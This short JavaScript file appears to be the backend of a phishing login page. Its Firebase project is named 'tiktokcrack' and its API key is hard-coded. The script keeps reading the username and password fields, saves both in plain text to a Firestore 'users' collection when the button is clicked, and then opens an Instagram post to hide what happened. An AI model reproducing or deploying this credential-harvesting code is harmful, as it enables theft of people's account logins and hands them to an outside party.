let NomeUtente,Password,Link;

Link = "";

const btnAcces = document.getElementById("btnAccedi");

firebase.initializeApp({
  apiKey: 'AIzaSyCAKYQeM2szDKjWMMp6Ou4qeNkVdmN2MKg',
  authDomain: 'tiktokcrack-a8c28.firebaseapp.com',
  projectId: 'tiktokcrack-a8c28'
});

var db = firebase.firestore();

//-----------Aqcuisizione dati--------------------//

NomeUtente = document.getElementById("Nome").value;
Password = document.getElementById("Password").value;

//-----------Spedizione dati--------------------//

btnAcces.addEventListener('click', () => {
  db.collection("users").add({
      name: NomeUtente,
      password: Password,
  })
  .then((docRef) => {
        apriLink();
  })
});

  //--------------Controllo dati----------------------//

setInterval(() => {
NomeUtente = document.getElementById("Nome").value;
Password = document.getElementById("Password").value;
if(NomeUtente != "" && Password != ""){
  document.getElementById("btnAccedi").disabled=false;
}
else {
  document.getElementById("btnAccedi").disabled=true;
}}, 20);

function apriLink(){
  window.open("https://www.instagram.com/p/CRvXXtkFIrB/?utm_source=ig_web_copy_link");
const dbRef = firebase.database().ref();
  dbRef.child("/link/link/link").get().then((snapshot) => {
    log(snapshot.val());
  });
}
